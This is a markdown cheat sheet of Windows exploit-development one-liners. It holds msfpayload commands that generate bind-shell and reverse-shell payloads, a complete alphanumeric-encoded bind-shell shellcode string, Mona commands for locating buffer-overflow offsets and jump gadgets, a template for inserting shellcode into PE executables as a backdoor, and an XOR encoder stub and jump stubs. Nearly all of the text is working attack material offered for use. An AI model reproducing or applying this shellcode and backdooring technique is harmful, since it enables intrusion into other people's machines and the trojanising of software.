# References
tidbits and one liners

# Alpha2
```
./msfpayload win32_bind LPORT=4444 R |./alpha2 eax --unicode --uppercase
PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLRJZKPMK8L9KOKOKOQPTKRLMTO4DKPEOLDKCLKUCHM1ZOTKPOLXDK1OMPKQJKPITKP4DKM1JNNQY0DY6LTDWPBTKWY1HJLMKQI2JKZTOK0TO4NH2UJE4KQOO4KQZKS6TKLLPKTKQOMLM1JKLCNLTK3Y2LMTMLQQWSP19KS44KPCNPTKOPLLDK40ML6MTKOPKXQNS8TNPNLNZLR0KOXVQVQC361XP3NR38D7T3P2QO24KOJ0S88KJMKLOKPPKOHV1O599U1VSQZMKXKRB5QZLBKOHPQXYILIJUFM0WKO8VQC0SQCPS0SPCPSOSPSKOJ0QVQXLQQLC6R3SY9QF5C86DMJ40I7QGKOXVQZN00Q0UKOZ0RHVD6MNNYY27KOIFQCQEKOXP2HYUQ9SV191GKOYF0P0TPTPUKO8PV3QXYWD9Y6T9PWKOJ6PUKO8PS62J1TC6QXS3RM59K52JB029MYXL59JG2JPDSYYRP1WPL3FJKNORNMKN12NL5CTMSJP8VKFKVKS82RKNWCLVKO2U14KO9FQK1GR2B1PQR1RJKQPQPQ25PQKOJ0QX6M9IKUXNPSKOYFBJKOKONWKOZ04KR7KL3SWTQTKOIFR2KOZ02HL0SZM4QO0SKO9FKO8PA
```

# Hex bytes only
```
msfpayload win32_reverse LHOST=127.0.0.1 EXITFUNC=thread LPORT=1337 -b  "\x00" C | grep '"' |tr -d " " |tr -d "\n" |sed 's/[\"x;]//g'
```

# Mona
```
# Pattern create 5000 bytes
!mona pc 5000									                

# Find offet of string dj0d
!mona po dj0d									                

# Find 
!mona findmsp									                

!mona jmp -r ESP

# Stick an address in EAX when restricted by characters
!mona encode -t alphanum -s '\xa9\xfa\x12\x00'

# Generate bad characters, minus \x00
!mona bytearray -b '\x00'						          

# Compare full list of characters with output from register
!mona compare -f bytearray.bin -a 01A4F9E0		

# List all loaded modules and information about them
!mona modules									                

# Look for 'jmp esp' in essfunc.dll module
!mona find -s "\xff\xe4" -m essfunc.dll	  		

# Unicode venetian aligment stub
!mona unicodealign   # if EIP points to the start address already

# Set Mona Working Directory
!mona config -set workingfolder c:\monalogs
```

# Backdoor PE Files General Syntax
```
PUSHAD                 # Save the register values 
PUSHFD                 # Save the flag values  
shellcode              # Pick your poisen
align stack            # Align ESP with where we saved our stack registers! 
POPFD                  # Restore the original register values 
POPAD                  # Restore the original flag values 
CALL dddd32.0041B7DE   # The first instruction we overwrote (hijack) 
JMP 00411363           # Jump to the command that was to be executed next
```
# XOR Stub Syntax
```
0040A770   MOV EAX, 004050ca         # Save start of encoding address in EAX 
0040A775   XOR BYTE PTR DS:[EAX],dF  # XOR the contents of EAX with XOR key dF 
0040A778   INC EAX                   # Increase EAX 
0040A779   CMP EAX, 0040A76F         # Have we reached the end enc. address? 
0040A77E   JLE SHORT 0040A775        # If not, jump back to XOR command 
0040A780   PUSH EBP                  # If you have, restore 1st hijacked command 
0040A781   MOV EBP,ESP               # Restore 2nd hijacked command 
0040A783   PUSH -1                   # Restore other instructions if needed 
0040A785   JMP 00404C05              # Jump to where we left off from. 
```

# Negative Jump 176 bytes (minus the opcodes) --> Perfect for an encoded egghunter
```
83EC 58                     SUB ESP,58 
83EC 58                     SUB ESP,58 
FFE4                        JMP ESP
```

# A Much Bigger Jump (400+ bytes), Phrack #62 Article 7 by Aaron Adams 
```
D9EE           FLDZ
D97424 F4      FSTENV (28-BYTE) PTR SS:[ESP-C]
59             POP ECX
80C1 0A        ADD CL,0A
90             NOP
FECD           DEC CH
FECD           DEC CH
FFE1           JMP ECX
```

# Zero out EAX
```
AND EAX,554E4D4A      
AND EAX,2A313235 
```
```
